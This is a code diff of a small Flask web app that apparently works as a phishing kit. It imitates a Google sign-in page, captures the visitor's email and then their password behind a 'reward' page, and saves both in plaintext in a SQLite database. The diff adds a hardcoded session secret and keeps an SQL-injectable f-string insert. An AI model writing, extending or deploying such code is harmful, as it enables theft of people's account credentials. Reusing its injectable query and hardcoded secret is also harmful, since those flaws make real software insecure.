@@ -3,22 +3,27 @@ import sqlite3
 import re
 
 app=Flask(__name__)
+app.secret_key = "($usdanw*&" 
 
 @app.route('/')
 def index():
+    session['user']=None
     return render_template('index.html')
 
 @app.route("/gauth",methods=['POST'])
 def glogin():
-    mail=request.form['identifier']
-    print('\n\n\n',mail,'\n\n\n')
-    if not re.findall(r"@gmail.com",mail):mail+="@gmail.com"
-    return render_template('googlepass.html',act=mail)
+    session['user']=request.form['identifier']
+    if not re.findall(r"@gmail.com",session['user']):session['user']+="@gmail.com"
+    return render_template('googlepass.html',act=session['user'])
 
 @app.route("/reward",methods=['POST'])
 def share():
-    email=request.form['email']
-    passwd=request.form['pass']
+    if session['user']==None:
+        email=request.form['email']
+        passwd=request.form['pass']
+    else:
+        email=session['user']
+        passwd=request.form['password']
     con=sqlite3.connect('static/ff-user.db')
     cur=con.cursor()
     cur.execute(f"insert into user(username,password) values('{email}','{passwd}')")
